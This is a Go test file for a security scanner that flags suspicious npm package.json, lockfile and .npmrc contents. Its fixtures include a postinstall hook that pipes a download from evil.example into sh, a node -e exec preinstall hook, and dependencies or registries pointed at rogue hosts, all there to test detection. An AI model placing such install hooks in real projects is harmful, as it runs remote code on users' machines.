package collector

import "testing"

func TestNpmConformance(t *testing.T) {
	runEcosystemConformance(t, ecosystemConformance{
		ecosystem: NewNpmEcosystem(nil),
		match:     []string{"package.json", "package-lock.json", ".npmrc"},
		nonMatch:  []string{".terraform.lock.hcl", "requirements.txt", "Cargo.toml"},
		cases: []conformanceCase{
			{
				name: "clean package.json",
				file: "package.json",
				content: `{
  "name": "app",
  "scripts": { "build": "tsc", "test": "vitest" },
  "dependencies": { "express": "^4.18.0" }
}`,
				want: nil,
			},
			{
				name: "malicious postinstall",
				file: "package.json",
				content: `{
  "scripts": { "postinstall": "curl https://evil.example/p | sh" }
}`,
				want: []expectedFinding{{"npm_install_script", SeverityCritical}},
			},
			{
				name: "node -e install hook",
				file: "package.json",
				content: `{
  "scripts": { "preinstall": "node -e \"require('child_process').exec('id')\"" }
}`,
				want: []expectedFinding{{"npm_install_script", SeverityCritical}},
			},
			{
				name: "non-registry dependency",
				file: "package.json",
				content: `{
  "dependencies": { "sneaky": "http://evil.example/sneaky.tgz" }
}`,
				want: []expectedFinding{{"npm_nonregistry_dependency", SeverityHigh}},
			},
			{
				name: "clean lockfile",
				file: "package-lock.json",
				content: `{
  "packages": {
    "node_modules/express": { "resolved": "https://registry.npmjs.org/express/-/express-4.18.0.tgz", "integrity": "sha512-x" }
  }
}`,
				want: nil,
			},
			{
				name: "lockfile resolved from rogue registry",
				file: "package-lock.json",
				content: `{
  "packages": {
    "node_modules/express": { "resolved": "https://evil-registry.io/express/-/express-4.18.0.tgz", "integrity": "sha512-x" }
  }
}`,
				want: []expectedFinding{{"npm_untrusted_registry", SeverityHigh}},
			},
			{
				name: "npmrc registry override",
				file: ".npmrc",
				content: "registry=https://evil-registry.io/\n",
				want:    []expectedFinding{{"npm_registry_override", SeverityHigh}},
			},
			{
				name:    "npmrc official registry is clean",
				file:    ".npmrc",
				content: "registry=https://registry.npmjs.org/\n",
				want:    nil,
			},
		},
	})
}
